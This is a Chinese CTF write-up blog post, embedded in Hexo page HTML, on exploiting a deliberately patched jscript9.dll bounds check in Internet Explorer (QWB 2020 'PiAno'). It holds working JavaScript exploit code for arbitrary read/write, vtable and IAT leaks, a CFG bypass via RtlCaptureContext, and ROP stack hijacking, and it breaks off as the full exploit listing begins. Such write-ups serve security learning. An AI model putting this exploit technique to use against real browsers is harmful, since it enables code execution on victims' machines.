@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222678 0x00前言最近在学浏览器方面的漏洞挖掘，就从强网杯的这道PiAno(PA)来分享一下我个人的收获与总结题目信息：**题目名称：**PiAno**旗帜名称：**PA**题目描述：**附件中提供了一个Win10虚拟机，虚拟机中存在一个patch过jscript9.dll的IE浏览器，挖掘并利用程序漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)">
+<meta property="og:url" content="https://github.com/ha1vk/2020/11/23/qwb2020-final-PiAno/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222678 0x00前言最近在学浏览器方面的漏洞挖掘，就从强网杯的这道PiAno(PA)来分享一下我个人的收获与总结题目信息：**题目名称：**PiAno**旗帜名称：**PA**题目描述：**附件中提供了一个Win10虚拟机，虚拟机中存在一个patch过jscript9.dll的IE浏览器，挖掘并利用程序漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01fac10699c046efd7.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01cb2f16d9cd496aac.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t018c208a44fc32d5ff.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01d75c5f72393d0489.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01a5a004f48792d8de.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t016ba7992fbfa2905f.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0196b07d61e385217f.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01b3d0326317af33e4.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t015dc7e473981b1114.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t018be716077fd46c72.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01c90db7c074ad1001.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0189043b7c25f844fb.png">
+<meta property="article:published_time" content="2020-11-23T06:30:21.000Z">
+<meta property="article:modified_time" content="2025-06-26T08:58:08.293Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="windows漏洞利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p4.ssl.qhimg.com/t01fac10699c046efd7.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/11/23/qwb2020-final-PiAno/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/11/23/qwb2020-final-PiAno/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-23 14:30:21" itemprop="dateCreated datePublished" datetime="2020-11-23T14:30:21+08:00">2020-11-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 16:58:08" itemprop="dateModified" datetime="2025-06-26T16:58:08+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222678">https://www.anquanke.com/post/id/222678</a></p>
+<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近在学浏览器方面的漏洞挖掘，就从强网杯的这道PiAno(PA)来分享一下我个人的收获与总结<br><strong>题目信息：</strong><br>**题目名称：**PiAno<br>**旗帜名称：**PA<br>**题目描述：**附件中提供了一个Win10虚拟机，虚拟机中存在一个patch过jscript9.dll的IE浏览器，挖掘并利用程序漏洞，实现任意代码执行，在靶机中弹出计算器程序。<br>**靶机环境：**Win10 虚拟机。<br>**附件信息：**Win10 虚拟机（与靶机一致）。<br>**展示环境拓扑：**交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。<br>验证过程：选手携带自己的攻击机上台展示题解，操作人员使用虚拟机中的IE浏览器访问选手的提供的页面。在规定的时间内，在靶机中弹出计算器程序判定为题解正确。<br>**注意事项：**上台展示题解的时候注意关闭exp的调试信息。</p>
+<h2 id="0x01-挖掘过程"><a href="#0x01-挖掘过程" class="headerlink" title="0x01 挖掘过程"></a>0x01 挖掘过程</h2><h3 id="找到patch点"><a href="#找到patch点" class="headerlink" title="找到patch点"></a>找到patch点</h3><p>从题目描述得知，被patch的文件是IE浏览器的jscript9.dll这个动态库，该库是IE浏览器的JS引擎，因此可以知道漏洞点出在JS上，并且靠JS来实现利用。IE浏览器分32位和64位，我们需要先确定是哪个版本的jscript9.dll被patch了，首先进入题目的虚拟机，查看64位下的jscript9.dll文件的版本，发现版本为11.0.19041.508，正好我本机的IE浏览器的jscript9.dll文件也是这个版本<br><img src="https://p4.ssl.qhimg.com/t01fac10699c046efd7.png"></p>
+<p>通过Fairdell HexCmp2文件差异对比，发现64位jscript9.dll没有被patch，32位的jscript9.dll被patch了，差异点如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Different between:</span><br><span class="line">First file: &quot;C:\Users\Administrator\Desktop\realword\jscript9.dll&quot;</span><br><span class="line">Second file: &quot;C:\Users\Administrator\Desktop\realword\jscript9_after.dll&quot;</span><br><span class="line">Shift: 0</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">First file: &quot;C:\Users\Administrator\Desktop\realword\jscript9.dll&quot;</span><br><span class="line">Second file: &quot;C:\Users\Administrator\Desktop\realword\jscript9_after.dll&quot;</span><br><span class="line">Shift: 0</span><br><span class="line">Shift: 0</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">000DFE00 |                0F 83 C9 | 000DFE00 |                90 90 90 |</span><br><span class="line">000DFE08 | 00 00 00                | 000DFE08 | 90 90 90                |</span><br><span class="line">000DFE10 |    3F                   | 000DFE10 |    06                   |</span><br><span class="line">000DFE18 |                      72 | 000DFE18 |                      EB |</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">000DFE88 |          E8 EB 69 04 00 | 000DFE88 |          90 90 90 90 90 |</span><br><span class="line">------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+<h3 id="分析patch点"><a href="#分析patch点" class="headerlink" title="分析patch点"></a>分析patch点</h3><p>微软为开发者提供了自家产品的符号文件，我们可以用32位的windbg目录下的symchk程序单独下载dll的符号，得到一个pdb文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symchk.exe jscript9.dll /s SRV*c:\symbols\*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>
+<p>我们将jscript9.dll以及jscript9_patched.dll用IDA分析，然后将符号文件导入IDA后，跳转到差异处进行分析，该patch位于Js::JavascriptNativeIntArray::SetItem函数中，可以知道该漏洞与Js::JavascriptNativeIntArray有关，也就是js里的整数型数组有问题。<br><img src="https://p4.ssl.qhimg.com/t01cb2f16d9cd496aac.png"></p>
+<p>发现有些指令直接被nop了，查看伪代码<br><img src="https://p2.ssl.qhimg.com/t018c208a44fc32d5ff.png"></p>
+<p>再查看一下未patch前的代码<br><img src="https://p5.ssl.qhimg.com/t01d75c5f72393d0489.png"></p>
+<p>对比可以发现，在setItem操作中，patch掉了对数组下标的大小进行正向越界检查，index为无符号数,通过<code>index - *v7</code>计算数组的下标，然后<code>v7[v8+4] = v6</code>可以越界写int数据<br><img src="https://p2.ssl.qhimg.com/t01a5a004f48792d8de.png"></p>
+<h3 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h3><p>通过上面的分析可以知道，在这个js引擎中，整数数组已经具有了任意地址<code>写</code>的能力，但是还不具有任意地址<code>读</code>的能力。为此，我们先利用任意地址写的能力，修改intarray自身的头部的几个用于表示该数组长度范围的成员变量为-1，从而使得该intarray具有任意地址读的能力。IE9之后使用的是Chakra引擎，从代码仓库可以找到该引擎的源码，从而可以得到JavascriptNativeIntArray的结构，由于源码过于复杂，不容易分析出其成员变量的分布，因此我们直接用windbg进行动态调试，确定需要修改的相关变量的位置。</p>
+<p>首先写上测试用的html页面，启动32位IE浏览器，打开这个页面，当弹出对话框时，使用windbg attach到进程上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">	  var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];</span><br><span class="line">	  alert(&quot;ready to go!&quot;);</span><br><span class="line">	  vuln[0x66] = 1;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>接下来利用<code>bp jscript9.dll基址+0xE09FA</code>在此处设置断点后继续运行<br><img src="https://p5.ssl.qhimg.com/t016ba7992fbfa2905f.png"><br>断点断下来后，可以看到ecx正是我们的数组下标·<code>0x66</code>，并且<code>edi+0x10</code>处正是intarray对象的数组数据区起始位置<br><img src="https://p2.ssl.qhimg.com/t0196b07d61e385217f.png"><br>查看其前方的数据，可以发现有几个数据与我们的数组长度相当,我们将其全部改为<code>0xFFFFFFFF</code>以后发现该对象就能够进行任意地址读了。<br><img src="https://p3.ssl.qhimg.com/t01b3d0326317af33e4.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//修改自身的size，实现任意地址读写</span><br><span class="line">vuln[0x3ffffffe] = -1;</span><br><span class="line">vuln[0x3ffffffd] = -1;</span><br><span class="line">vuln[0x3ffffff6] = -1;</span><br></pre></td></tr></table></figure>
+<p>具有任意地址读写以后，就是常规的利用了。</p>
+<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>我们也看到，数据区前方就有jscript9.dll里的指针，进一步分析还可以知道这是一个虚表地址。</p>
+<p><img src="https://p5.ssl.qhimg.com/t015dc7e473981b1114.png"></p>
+<p>因此直接越界读，泄露虚表地址得到jscript9.dll的地址，进而得到其他函数的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//泄露vtable地址</span><br><span class="line">var vtable_addr = vuln[0x3ffffff2];</span><br><span class="line">var jscript9_base = vtable_addr - 0x37e8;</span><br><span class="line">var LoadLibraryExA_ptr = jscript9_base + 0x37600C;</span><br><span class="line">var GetProcAddress_ptr = jscript9_base + 0x3761A8;</span><br><span class="line">var VirtualProtect_ptr = jscript9_base + 0x376110;</span><br><span class="line">var RtlCaptureContext_ptr = jscript9_base + 0x376488;</span><br><span class="line">var pop_esp = jscript9_base + 0x774ff;</span><br><span class="line">var mov_esp_ebx = jscript9_base + 0x23721a;</span><br><span class="line">var add_esp = jscript9_base + 0x270d5c;</span><br><span class="line">var base = vuln[0x3ffffff8] + 0x10;</span><br><span class="line">//alert(&quot;jscript9_base=&quot;+jscript9_base.toString(16));</span><br><span class="line">//alert(&quot;base=&quot;+base.toString(16));</span><br><span class="line">//4字节地址对齐的任意地址读</span><br><span class="line">function arb_read(addr) &#123;</span><br><span class="line">   var offset = addr - base;</span><br><span class="line">if (offset &lt; 0) &#123;</span><br><span class="line">   offset = (0x100000000 + offset) / 4;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">   offset = offset / 4;</span><br><span class="line">&#125;</span><br><span class="line">return vuln[offset];</span><br><span class="line">&#125;</span><br><span class="line">function packInt(value) &#123;</span><br><span class="line">   if (value &gt; 0x80000000) &#123;</span><br><span class="line">   value = value - 0x100000000;</span><br><span class="line">&#125;</span><br><span class="line">return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);</span><br><span class="line">var GetProcAddress_addr = arb_read(GetProcAddress_ptr);</span><br><span class="line">var VirtualProtect_addr = arb_read(VirtualProtect_ptr);</span><br><span class="line">var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);</span><br></pre></td></tr></table></figure>
+<p>现在就是劫持程序流了，该模块开启了CFG机制，因此不能将虚表里的函数劫持为gadgets，只能劫持为一个完整的函数。</p>
+<h3 id="CFG绕过"><a href="#CFG绕过" class="headerlink" title="CFG绕过"></a>CFG绕过</h3><p>绕过的方法是先将虚表里的函数劫持为某些对我们利用有帮助的函数，然后进行后续的其他方法利用。<code>RtlCaptureContext</code>是一个非常有用的函数，其位于ntdll.dll模块里，这里我们已经通过IAT表泄露出了它的地址，该函数可以<code>将当前的所有寄存器值保存到参数给定的内存空间里</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:4B307260                 public RtlCaptureContext</span><br><span class="line">.text:4B307260 RtlCaptureContext proc near             ; CODE XREF: sub_4B2F38E6+A↑p</span><br><span class="line">.text:4B307260                                         ; RtlRaiseException+B↓p ...</span><br><span class="line">.text:4B307260</span><br><span class="line">.text:4B307260 var_4           = dword ptr -4</span><br><span class="line">.text:4B307260 ContextRecord   = dword ptr  4</span><br><span class="line">.text:4B307260</span><br><span class="line">.text:4B307260                 push    ebx</span><br><span class="line">.text:4B307261                 mov     ebx, [esp+4+ContextRecord]</span><br><span class="line">.text:4B307265                 mov     [ebx+0B0h], eax</span><br><span class="line">.text:4B30726B                 mov     [ebx+0ACh], ecx</span><br><span class="line">.text:4B307271                 mov     [ebx+0A8h], edx</span><br><span class="line">.text:4B307277                 mov     eax, [esp+4+var_4]</span><br><span class="line">.text:4B30727A                 mov     [ebx+0A4h], eax</span><br><span class="line">.text:4B307280                 mov     [ebx+0A0h], esi</span><br><span class="line">.text:4B307286                 mov     [ebx+9Ch], edi</span><br><span class="line">.text:4B30728C                 jmp     short loc_4B3072D1</span><br><span class="line">.text:4B30728C RtlCaptureContext endp</span><br><span class="line"></span><br><span class="line">.text:4B3072D1 loc_4B3072D1:                           ; CODE XREF: RtlCaptureContext+2C↑j</span><br><span class="line">.text:4B3072D1                 mov     word ptr [ebx+0BCh], cs</span><br><span class="line">.text:4B3072D7                 mov     word ptr [ebx+98h], ds</span><br><span class="line">.text:4B3072DD                 mov     word ptr [ebx+94h], es</span><br><span class="line">.text:4B3072E3                 mov     word ptr [ebx+90h], fs</span><br><span class="line">.text:4B3072E9                 mov     word ptr [ebx+8Ch], gs</span><br><span class="line">.text:4B3072EF                 mov     word ptr [ebx+0C8h], ss</span><br><span class="line">.text:4B3072F5                 pushf</span><br><span class="line">.text:4B3072F6                 pop     dword ptr [ebx+0C0h]</span><br><span class="line">.text:4B3072FC                 mov     eax, [ebp+4]</span><br><span class="line">.text:4B3072FF                 mov     [ebx+0B8h], eax</span><br><span class="line">.text:4B307305                 mov     eax, [ebp+0]</span><br><span class="line">.text:4B307308                 mov     [ebx+0B4h], eax</span><br><span class="line">.text:4B30730E                 lea     eax, [ebp+8]</span><br><span class="line">.text:4B307311                 mov     [ebx+0C4h], eax</span><br><span class="line">.text:4B307317                 mov     dword ptr [ebx], 10007h</span><br><span class="line">.text:4B30731D                 pop     ebx</span><br><span class="line">.text:4B30731E                 retn    4</span><br></pre></td></tr></table></figure>
+<p>利用这一点，我们可以读出栈地址，然后可以利用任意地址读写的能力去劫持栈。</p>
+<p>通过观察，发现劫持虚表里的hasItem函数比较可靠，因为只有一个参数，正好可以给我们用于传递地址参数，由于虚表是只读的，因此我们直接伪造一个虚表，在对应位置伪造hasItem函数指针<br><img src="https://p2.ssl.qhimg.com/t018be716077fd46c72.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//伪造该对象的虚表，从而leak出寄存器地址</span><br><span class="line">var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];</span><br><span class="line">leak[0x3ffffffe] = -1;</span><br><span class="line">leak[0x3ffffffd] = -1;</span><br><span class="line">leak[0x3ffffff6] = -1;</span><br><span class="line">var fake_vtable_addr = leak[0x3ffffff8] + 0x10;</span><br><span class="line">leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针</span><br><span class="line">//修改leak的虚表指针</span><br><span class="line">leak[0x3ffffff2] = fake_vtable_addr;</span><br></pre></td></tr></table></figure>
+<p>要触发hasItem的调用，只需要利用数组对象的in语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//调用hasItem，结果存放于base地址处</span><br><span class="line">var x = (base in leak);</span><br><span class="line">var stack_addr = arb_read(base + 0xB4);</span><br></pre></td></tr></table></figure>
+<h3 id="劫持栈做ROP"><a href="#劫持栈做ROP" class="headerlink" title="劫持栈做ROP"></a>劫持栈做ROP</h3><p>由于是数组对象的任意地址读写，我们如果直接用下标的方式去写，每次只能写4个字节数据，而劫持栈是需要一次性将ROP全部写到栈里去的，于是，我们发现了另一个函数<code>Js::JavascriptArray::EntryPush</code>，该函数会循环的将参数里的数组数据依次push到当前被调用的数组对象里<br><img src="https://p5.ssl.qhimg.com/t01c90db7c074ad1001.png"><br>因此，我们可以劫持Js::JavascriptArray::EntryPush的栈返回地址，当循环执行完成时，ROP需要的数据都已写到栈里，当Js::JavascriptArray::EntryPush执行ret时便能执行ROP链。</p>
+<h3 id="完整利用exp-html"><a href="#完整利用exp-html" class="headerlink" title="完整利用exp.html"></a>完整利用exp.html</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 